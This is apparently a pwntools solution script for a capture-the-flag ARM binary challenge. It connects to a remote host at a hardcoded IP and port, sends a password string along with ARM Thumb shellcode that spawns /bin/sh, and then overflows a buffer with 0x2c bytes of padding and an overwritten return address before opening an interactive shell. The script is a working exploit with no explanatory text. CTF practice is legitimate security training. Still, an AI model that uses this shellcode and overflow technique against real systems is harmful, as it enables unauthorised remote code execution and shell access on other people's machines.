from pwn import *

context(log_level='DEBUG', binary='chall')
context.terminal = "wt.exe nt bash -c".split()

# sh = process('sudo chroot . ./qemu-arm-static -g 12345 chall'.split())
# sh = process('sudo chroot . ./qemu-arm-static chall'.split())
sh = remote("47.108.29.107", 10173)
elf = ELF('./chall')
libc = ELF('./libc-2.27.so')

# gdb.attach(sh, 'target remote :12345\n')
sc = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1" \
    b"\x03\xa0\x52\x40\xc2\x71\x05\xb4" \
    b"\x69\x46\x0b\x27\x01\xdf\x7f\x40" \
    b"\x2f\x62\x69\x6e\x2f\x73\x68\x41"
sh.sendlineafter(b"msg> ", b"s1mpl3Dec0d4r\n\x00\x00" + sc)

payload = b'a'*(0x2c) + p32(0x22160)
sh.sendafter(b"comment> ", payload)
sh.interactive()
